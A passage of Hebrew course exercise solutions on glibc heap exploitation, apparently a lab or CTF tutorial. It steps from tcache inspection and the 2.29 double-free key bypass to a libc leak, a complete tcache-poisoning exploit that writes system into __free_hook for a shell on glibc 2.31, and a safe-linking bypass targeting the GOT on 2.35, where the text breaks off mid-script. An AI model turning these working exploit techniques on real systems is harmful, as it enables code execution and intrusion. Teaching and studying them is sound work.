+<h3 id="1-tcache">פתרון תרגיל 1 - מיפוי ה-tcache<a class="headerlink" href="#1-tcache" title="Permanent link">&para;</a></h3>
+<p>מריצים תחת gdb, מקצים שני צ'אנקים <code>0x50</code> ומשחררים:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>pwndbg&gt; tcachebins
+<a id="__codelineno-1-2" name="__codelineno-1-2" href="#__codelineno-1-2"></a>tcachebins
+<a id="__codelineno-1-3" name="__codelineno-1-3" href="#__codelineno-1-3"></a>0x60 [  2]: 0x5555555592a0 -&gt; 0x555555559240 &lt;- 0x0
+</code></pre></div>
+<p>הצ'אנק ששוחרר אחרון (<code>0x...2a0</code>, שהיה idx 1) נמצא בראש, ואחריו idx 0 (<code>0x...240</code>). זו רשימת LIFO. הסתכלות על הזיכרון:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>pwndbg&gt; x/4gx 0x555555559240
+<a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>0x555555559240: 0x0000555555559290  0x0000555555559010
+<a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>                \_ next (fd)          \_ key == address of tcache_perthread_struct
+</code></pre></div>
+<p>שדה ה-<code>next</code> של idx 0 מצביע ל-idx 1, ושדה ה-key (<code>0x...010</code>) מצביע לתחילת ה-heap, שם יושב <code>tcache_perthread_struct</code>. זה בדיוק המבנה מההרצאה: <code>next</code> ב-offset 0, <code>key</code> ב-offset 8.</p>
+<h3 id="2-229">פתרון תרגיל 2 - בדיקת המפתח של 2.29 ועקיפתה<a class="headerlink" href="#2-229" title="Permanent link">&para;</a></h3>
+<p>שחרור כפול נאיבי:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a><span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+<a id="__codelineno-3-2" name="__codelineno-3-2" href="#__codelineno-3-2"></a><span class="n">alloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+<a id="__codelineno-3-3" name="__codelineno-3-3" href="#__codelineno-3-3"></a><span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+<a id="__codelineno-3-4" name="__codelineno-3-4" href="#__codelineno-3-4"></a><span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+<a id="__codelineno-3-5" name="__codelineno-3-5" href="#__codelineno-3-5"></a><span class="nb">print</span><span class="p">(</span><span class="n">p</span><span class="o">.</span><span class="n">recvall</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="n">errors</span><span class="o">=</span><span class="s1">&#39;replace&#39;</span><span class="p">))</span>
+</code></pre></div>
+<p>הפלט:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>free(): double free detected in tcache 2
+</code></pre></div>
+<p>זה מגיע מההשוואה <code>e-&gt;key == tcache</code> בזמן השחרור השני: מכיוון שהשחרור הראשון כתב <code>key = tcache</code>, glibc מזהה את הצ'אנק כבר ברשימה וקורס. עכשיו העקיפה - דורסים את שדה ה-key לפני השחרור השני:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a><span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+<a id="__codelineno-5-2" name="__codelineno-5-2" href="#__codelineno-5-2"></a><span class="n">alloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+<a id="__codelineno-5-3" name="__codelineno-5-3" href="#__codelineno-5-3"></a><span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>                 <span class="c1"># bin: [0], key = tcache</span>
+<a id="__codelineno-5-4" name="__codelineno-5-4" href="#__codelineno-5-4"></a><span class="n">edit</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="o">*</span><span class="mi">16</span><span class="p">)</span>     <span class="c1"># next stays 0 (was NULL), key -&gt; 0  (different from tcache)</span>
+<a id="__codelineno-5-5" name="__codelineno-5-5" href="#__codelineno-5-5"></a><span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>                 <span class="c1"># passes! key != tcache, the check doesn&#39;t trigger</span>
+</code></pre></div>
+<p>בדיקה ב-gdb מראה עכשיו <code>count = 2</code> באותו bin, עם הצ'אנק מצביע על עצמו - כלומר שחרור כפול מוצלח. שמרנו את 8 הבתים הראשונים (ה-<code>next</code>, שהיה ממילא NULL) וכתבנו אפס על ה-key בלבד.</p>
+<p>למה זה עבד: הבדיקה של 2.29 היא נקודתית - היא סומכת על שדה ה-key בתוך הצ'אנק. כל שליטה בכתיבה לצ'אנק המשוחרר (UAF) מאפשרת לזייף אותו. אם אין UAF edit, המסלול החלופי הוא fastbin dup (<code>free(a); free(b); free(a)</code> אחרי מילוי ה-tcache).</p>
+<h3 id="3-leak-libc-unsorted-bin">פתרון תרגיל 3 - leak libc דרך ה-unsorted bin<a class="headerlink" href="#3-leak-libc-unsorted-bin" title="Permanent link">&para;</a></h3>
+<p>מקצים צ'אנק גדול מדי בשביל tcache, צ'אנק שמירה אחריו, משחררים וקוראים:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+<a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="n">alloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>   <span class="c1"># chunk 0x510 -&gt; doesn&#39;t fit in tcache</span>
+<a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="n">alloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span>  <span class="sa">b</span><span class="s1">&#39;B&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>   <span class="c1"># guard: prevents merging with top</span>
+<a id="__codelineno-6-4" name="__codelineno-6-4" href="#__codelineno-6-4"></a><span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>                    <span class="c1"># -&gt; unsorted bin, fd/bk = main_arena+0x60</span>
+<a id="__codelineno-6-5" name="__codelineno-6-5" href="#__codelineno-6-5"></a><span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">view</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">)[:</span><span class="mi">8</span><span class="p">])</span>
+<a id="__codelineno-6-6" name="__codelineno-6-6" href="#__codelineno-6-6"></a><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;unsorted leak = </span><span class="si">%#x</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">leak</span><span class="p">)</span>
+</code></pre></div>
+<p>מודדים את ה-offset פעם אחת ב-gdb. אחרי ה-<code>free</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a>pwndbg&gt; bins
+<a id="__codelineno-7-2" name="__codelineno-7-2" href="#__codelineno-7-2"></a>unsortedbin
+<a id="__codelineno-7-3" name="__codelineno-7-3" href="#__codelineno-7-3"></a>all: 0x5555555596b0 -&gt; 0x7ffff7fac000 (main_arena+96) &lt;- ...
+<a id="__codelineno-7-4" name="__codelineno-7-4" href="#__codelineno-7-4"></a>pwndbg&gt; p/x 0x7ffff7fac000 - 0x7ffff7dc0000     # leak - libc_base
+<a id="__codelineno-7-5" name="__codelineno-7-5" href="#__codelineno-7-5"></a>$1 = 0x1ecbe0
+</code></pre></div>
+<p>כלומר לגרסה הזו, <code>leak = libc_base + 0x1ecbe0</code>. משלימים:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0x1ecbe0</span>
+<a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;libc base = </span><span class="si">%#x</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
+<a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a><span class="k">assert</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">&amp;</span> <span class="mh">0xfff</span> <span class="o">==</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;not page aligned -&gt; libc/offset is wrong&#39;</span>
+</code></pre></div>
+<p>בדיקת השפיות: הבסיס תמיד נגמר ב-<code>000</code> (alignment עמוד). אם לא - טעיתם ב-offset או שה-libc אינו הגרסה הנכונה.</p>
+<h3 id="4-__free_hook-glibc-231">פתרון תרגיל 4 - הרעלה אל __free_hook (glibc 2.31)<a class="headerlink" href="#4-__free_hook-glibc-231" title="Permanent link">&para;</a></h3>
+<p>עכשיו מחברים הכל ל-exploit מלא. הנה הסקריפט מקצה לקצה על 2.31:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a><span class="ch">#!/usr/bin/env python3</span>
+<a id="__codelineno-9-2" name="__codelineno-9-2" href="#__codelineno-9-2"></a><span class="kn">from</span><span class="w"> </span><span class="nn">pwn</span><span class="w"> </span><span class="kn">import</span> <span class="o">*</span>
+<a id="__codelineno-9-3" name="__codelineno-9-3" href="#__codelineno-9-3"></a>
+<a id="__codelineno-9-4" name="__codelineno-9-4" href="#__codelineno-9-4"></a><span class="n">context</span><span class="o">.</span><span class="n">binary</span> <span class="o">=</span> <span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./tc&#39;</span><span class="p">)</span>
+<a id="__codelineno-9-5" name="__codelineno-9-5" href="#__codelineno-9-5"></a><span class="n">libc</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./libc.so.6&#39;</span><span class="p">)</span>
+<a id="__codelineno-9-6" name="__codelineno-9-6" href="#__codelineno-9-6"></a><span class="c1"># ... helper functions menu/alloc/free/edit/view go here ...</span>
+<a id="__codelineno-9-7" name="__codelineno-9-7" href="#__codelineno-9-7"></a>
+<a id="__codelineno-9-8" name="__codelineno-9-8" href="#__codelineno-9-8"></a><span class="n">p</span> <span class="o">=</span> <span class="n">start</span><span class="p">()</span>
+<a id="__codelineno-9-9" name="__codelineno-9-9" href="#__codelineno-9-9"></a>
+<a id="__codelineno-9-10" name="__codelineno-9-10" href="#__codelineno-9-10"></a><span class="c1"># ---------- Stage 1: leak libc via unsorted bin ----------</span>
+<a id="__codelineno-9-11" name="__codelineno-9-11" href="#__codelineno-9-11"></a><span class="n">alloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;A&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+<a id="__codelineno-9-12" name="__codelineno-9-12" href="#__codelineno-9-12"></a><span class="n">alloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0x20</span><span class="p">,</span>  <span class="sa">b</span><span class="s1">&#39;B&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+<a id="__codelineno-9-13" name="__codelineno-9-13" href="#__codelineno-9-13"></a><span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">)</span>
+<a id="__codelineno-9-14" name="__codelineno-9-14" href="#__codelineno-9-14"></a><span class="n">leak</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">view</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x500</span><span class="p">)[:</span><span class="mi">8</span><span class="p">])</span>
+<a id="__codelineno-9-15" name="__codelineno-9-15" href="#__codelineno-9-15"></a><span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">=</span> <span class="n">leak</span> <span class="o">-</span> <span class="mh">0x1ecbe0</span>            <span class="c1"># measure it yourselves!</span>
+<a id="__codelineno-9-16" name="__codelineno-9-16" href="#__codelineno-9-16"></a><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;libc base = </span><span class="si">%#x</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span><span class="p">)</span>
+<a id="__codelineno-9-17" name="__codelineno-9-17" href="#__codelineno-9-17"></a><span class="k">assert</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">&amp;</span> <span class="mh">0xfff</span> <span class="o">==</span> <span class="mi">0</span>
+<a id="__codelineno-9-18" name="__codelineno-9-18" href="#__codelineno-9-18"></a>
+<a id="__codelineno-9-19" name="__codelineno-9-19" href="#__codelineno-9-19"></a><span class="n">free_hook</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;__free_hook&#39;</span><span class="p">]</span>
+<a id="__codelineno-9-20" name="__codelineno-9-20" href="#__codelineno-9-20"></a><span class="n">system</span>    <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
+<a id="__codelineno-9-21" name="__codelineno-9-21" href="#__codelineno-9-21"></a><span class="n">log</span><span class="o">.</span><span class="n">info</span><span class="p">(</span><span class="s1">&#39;__free_hook = </span><span class="si">%#x</span><span class="s1">  system = </span><span class="si">%#x</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">free_hook</span><span class="p">,</span> <span class="n">system</span><span class="p">)</span>
+<a id="__codelineno-9-22" name="__codelineno-9-22" href="#__codelineno-9-22"></a>
+<a id="__codelineno-9-23" name="__codelineno-9-23" href="#__codelineno-9-23"></a><span class="c1"># ---------- Stage 2: tcache poisoning to __free_hook ----------</span>
+<a id="__codelineno-9-24" name="__codelineno-9-24" href="#__codelineno-9-24"></a><span class="n">alloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;C&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+<a id="__codelineno-9-25" name="__codelineno-9-25" href="#__codelineno-9-25"></a><span class="n">alloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;D&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+<a id="__codelineno-9-26" name="__codelineno-9-26" href="#__codelineno-9-26"></a><span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>                                <span class="c1"># bin: [3]        count 1</span>
+<a id="__codelineno-9-27" name="__codelineno-9-27" href="#__codelineno-9-27"></a><span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>                                <span class="c1"># bin: [2]-&gt;[3]   count 2</span>
+<a id="__codelineno-9-28" name="__codelineno-9-28" href="#__codelineno-9-28"></a><span class="n">edit</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">free_hook</span><span class="p">))</span>                <span class="c1"># 2.next = &amp;__free_hook  (no mangling, 2.31)</span>
+<a id="__codelineno-9-29" name="__codelineno-9-29" href="#__codelineno-9-29"></a>
+<a id="__codelineno-9-30" name="__codelineno-9-30" href="#__codelineno-9-30"></a><span class="n">alloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;E&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>                 <span class="c1"># returns 2. head of the list = __free_hook</span>
+<a id="__codelineno-9-31" name="__codelineno-9-31" href="#__codelineno-9-31"></a><span class="n">alloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">5</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">))</span>            <span class="c1"># returns a chunk on __free_hook -&gt; writes system</span>
+<a id="__codelineno-9-32" name="__codelineno-9-32" href="#__codelineno-9-32"></a>
+<a id="__codelineno-9-33" name="__codelineno-9-33" href="#__codelineno-9-33"></a><span class="c1"># ---------- Stage 3: trigger ----------</span>
+<a id="__codelineno-9-34" name="__codelineno-9-34" href="#__codelineno-9-34"></a><span class="n">alloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">6</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;/bin/sh</span><span class="se">\x00</span><span class="s1">&#39;</span><span class="p">)</span>
+<a id="__codelineno-9-35" name="__codelineno-9-35" href="#__codelineno-9-35"></a><span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">6</span><span class="p">)</span>                                <span class="c1"># __free_hook(&quot;/bin/sh&quot;) == system(&quot;/bin/sh&quot;)</span>
+<a id="__codelineno-9-36" name="__codelineno-9-36" href="#__codelineno-9-36"></a>
+<a id="__codelineno-9-37" name="__codelineno-9-37" href="#__codelineno-9-37"></a><span class="n">p</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
+</code></pre></div>
+<p>מריצים ומקבלים shell:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>$ python3 exploit.py
+<a id="__codelineno-10-2" name="__codelineno-10-2" href="#__codelineno-10-2"></a>[+] libc base = 0x7ffff7dc0000
+<a id="__codelineno-10-3" name="__codelineno-10-3" href="#__codelineno-10-3"></a>[*] Switching to interactive mode
+<a id="__codelineno-10-4" name="__codelineno-10-4" href="#__codelineno-10-4"></a>$ id
+<a id="__codelineno-10-5" name="__codelineno-10-5" href="#__codelineno-10-5"></a>uid=1000(user) gid=1000(user) ...
+</code></pre></div>
+<p>למה זה עבד: שחררנו שני צ'אנקים לאותו bin (מונה 2), דרסנו את ה-<code>next</code> של הראש ל-<code>__free_hook</code>, ושתי הקצאות מאוחר יותר נחתו בדיוק שם. חשוב היה לשחרר <strong>שניים</strong> - עם שחרור בודד המונה היה יורד ל-0 וההקצאה השנייה הייתה מדלגת על ה-tcache. הכל עבד גולמי כי 2.31 עוד בלי safe-linking, ו-<code>__free_hook</code> עדיין קיים.</p>
+<p>איך להכליל: כל יעד כתיב שווה - GOT (ב-Partial RELRO), <code>__malloc_hook</code>, מבני FILE. הכלל: הקצאה שרירותית + יעד = חטיפת הרצה.</p>
+<h3 id="5-glibc-235">פתרון תרגיל 5 - אותה התקפה על glibc 2.35<a class="headerlink" href="#5-glibc-235" title="Permanent link">&para;</a></h3>
+<p>מריצים את הסקריפט של תרגיל 4 על הבינארי שקומפל ב-Ubuntu 22.04, ורואים שני כשלים:</p>
+<ol>
+<li>הקריאה <code>libc.sym['__free_hook']</code> מחזירה 0 - <strong>ה-hook הוסר ב-2.34</strong>.</li>
+<li>גם אם היינו כותבים ל-<code>next</code>, ה-safe-linking היה מפענח את זה לזבל - צריך לערבל.</li>
+</ol>
+<p>מתקנים את שני הדברים. ראשית, פונקציית הערבול והשגת leak heap דרך safe-linking עצמו:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a><span class="k">def</span><span class="w"> </span><span class="nf">encrypt</span><span class="p">(</span><span class="n">pos</span><span class="p">,</span> <span class="n">ptr</span><span class="p">):</span>
+<a id="__codelineno-11-2" name="__codelineno-11-2" href="#__codelineno-11-2"></a>    <span class="c1"># pos = the mem address of the chunk being poisoned (== address of the next field)</span>
+<a id="__codelineno-11-3" name="__codelineno-11-3" href="#__codelineno-11-3"></a>    <span class="k">return</span> <span class="p">(</span><span class="n">pos</span> <span class="o">&gt;&gt;</span> <span class="mi">12</span><span class="p">)</span> <span class="o">^</span> <span class="n">ptr</span>
+<a id="__codelineno-11-4" name="__codelineno-11-4" href="#__codelineno-11-4"></a>
+<a id="__codelineno-11-5" name="__codelineno-11-5" href="#__codelineno-11-5"></a><span class="c1"># heap leak: a single freed chunk -&gt; the mangled next is mem&gt;&gt;12</span>
+<a id="__codelineno-11-6" name="__codelineno-11-6" href="#__codelineno-11-6"></a><span class="n">alloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;C&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+<a id="__codelineno-11-7" name="__codelineno-11-7" href="#__codelineno-11-7"></a><span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>                                <span class="c1"># bin 0x60: [2], next = (mem2&gt;&gt;12) ^ 0</span>
+<a id="__codelineno-11-8" name="__codelineno-11-8" href="#__codelineno-11-8"></a><span class="n">mangled</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">view</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">)[:</span><span class="mi">8</span><span class="p">])</span>
+<a id="__codelineno-11-9" name="__codelineno-11-9" href="#__codelineno-11-9"></a><span class="n">heap</span> <span class="o">=</span> <span class="n">mangled</span> <span class="o">&lt;&lt;</span> <span class="mi">12</span>                       <span class="c1"># the heap&#39;s page address (the base)</span>
+<a id="__codelineno-11-10" name="__codelineno-11-10" href="#__codelineno-11-10"></a><span class="n">log</span><span class="o">.</span><span class="n">success</span><span class="p">(</span><span class="s1">&#39;heap base = </span><span class="si">%#x</span><span class="s1">&#39;</span><span class="p">,</span> <span class="n">heap</span><span class="p">)</span>
+</code></pre></div>
+<p>מודדים ב-gdb את ה-offset של הצ'אנק שנרעיל מבסיס ה-heap (יציב בין הרצות כי סדר ההקצאה קבוע). אצלנו הצ'אנק idx 2 יושב ב-<code>heap + 0x2a0</code>:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>pwndbg&gt; vis_heap_chunks
+<a id="__codelineno-12-2" name="__codelineno-12-2" href="#__codelineno-12-2"></a>0x...2a0   &lt;- chunk idx 2 (mem)
+<a id="__codelineno-12-3" name="__codelineno-12-3" href="#__codelineno-12-3"></a>pwndbg&gt; p/x 0x...2a0 &amp; 0xfff
+<a id="__codelineno-12-4" name="__codelineno-12-4" href="#__codelineno-12-4"></a>$1 = 0x2a0
+</code></pre></div>
+<p>עכשיו היעד. הבינארי <code>no-pie</code> עם Partial RELRO, אז ה-GOT כתיב. נדרוס כניסת GOT של פונקציה שנקראת מיד (<code>printf</code>, שרץ בכל תפריט) ל-one_gadget. שתי הערות קריטיות:</p>
+<ul>
+<li>בדיקת הalignment של safe-linking דורשת שהצ'אנק המורעל יהיה aligned ל-16, אז נבחר כניסת GOT שכתובתה aligned ל-16.</li>
+<li>הפונקציה <code>tcache_get</code> מאפסת את שדה ה-key (<code>e-&gt;key = NULL</code>), כלומר כותבת 8 בתים אחרי היעד. בגלל ש-<code>printf</code> נורה מיד עם הקריאה הבאה, השכן הנדרס לא מספיק להיקרא לפני שה-shell נפתח.</li>
+</ul>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a><span class="c1"># find a one_gadget whose constraint holds (check in gdb!)</span>
+<a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a><span class="n">gadgets</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0xebc81</span><span class="p">,</span> <span class="mh">0xebc85</span><span class="p">,</span> <span class="mh">0xebc88</span><span class="p">,</span> <span class="mh">0xebce2</span><span class="p">]</span>   <span class="c1"># from running one_gadget ./libc.so.6</span>
+<a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a><span class="n">one</span> <span class="o">=</span> <span class="n">libc</span><span class="o">.</span><span class="n">address</span> <span class="o">+</span> <span class="mh">0xebc88</span>
+<a id="__codelineno-13-4" name="__codelineno-13-4" href="#__codelineno-13-4"></a>
+<a id="__codelineno-13-5" name="__codelineno-13-5" href="#__codelineno-13-5"></a><span class="c1"># choose a GOT entry aligned to 16</span>
+<a id="__codelineno-13-6" name="__codelineno-13-6" href="#__codelineno-13-6"></a><span class="n">target</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">got</span><span class="p">[</span><span class="s1">&#39;printf&#39;</span><span class="p">]</span>
+<a id="__codelineno-13-7" name="__codelineno-13-7" href="#__codelineno-13-7"></a><span class="k">assert</span> <span class="n">target</span> <span class="o">%</span> <span class="mi">16</span> <span class="o">==</span> <span class="mi">0</span><span class="p">,</span> <span class="s1">&#39;choose a different function whose GOT entry is aligned to 16&#39;</span>
+<a id="__codelineno-13-8" name="__codelineno-13-8" href="#__codelineno-13-8"></a>
+<a id="__codelineno-13-9" name="__codelineno-13-9" href="#__codelineno-13-9"></a><span class="c1"># poison: reopen the chunk, build a pair, and overwrite a mangled next toward target</span>
+<a id="__codelineno-13-10" name="__codelineno-13-10" href="#__codelineno-13-10"></a><span class="n">alloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;C&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>                 <span class="c1"># same mem2 address (LIFO)</span>
+<a id="__codelineno-13-11" name="__codelineno-13-11" href="#__codelineno-13-11"></a><span class="n">alloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">3</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;D&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>
+<a id="__codelineno-13-12" name="__codelineno-13-12" href="#__codelineno-13-12"></a><span class="n">mem2</span> <span class="o">=</span> <span class="n">heap</span> <span class="o">+</span> <span class="mh">0x2a0</span>
+<a id="__codelineno-13-13" name="__codelineno-13-13" href="#__codelineno-13-13"></a><span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">3</span><span class="p">)</span>                                <span class="c1"># bin: [3]      count 1</span>
+<a id="__codelineno-13-14" name="__codelineno-13-14" href="#__codelineno-13-14"></a><span class="n">free</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">2</span><span class="p">)</span>                                <span class="c1"># bin: [2]-&gt;[3] count 2</span>
+<a id="__codelineno-13-15" name="__codelineno-13-15" href="#__codelineno-13-15"></a><span class="n">edit</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">2</span><span class="p">,</span> <span class="n">p64</span><span class="p">(</span><span class="n">encrypt</span><span class="p">(</span><span class="n">mem2</span><span class="p">,</span> <span class="n">target</span><span class="p">)))</span>    <span class="c1"># 2.next (mangled) -&gt; printf@got</span>
+<a id="__codelineno-13-16" name="__codelineno-13-16" href="#__codelineno-13-16"></a>
+<a id="__codelineno-13-17" name="__codelineno-13-17" href="#__codelineno-13-17"></a><span class="n">alloc</span><span class="p">(</span><span class="n">p</span><span class="p">,</span> <span class="mi">4</span><span class="p">,</span> <span class="mh">0x50</span><span class="p">,</span> <span class="sa">b</span><span class="s1">&#39;E&#39;</span><span class="o">*</span><span class="mi">8</span><span class="p">)</span>                 <span class="c1"># returns 2</span>
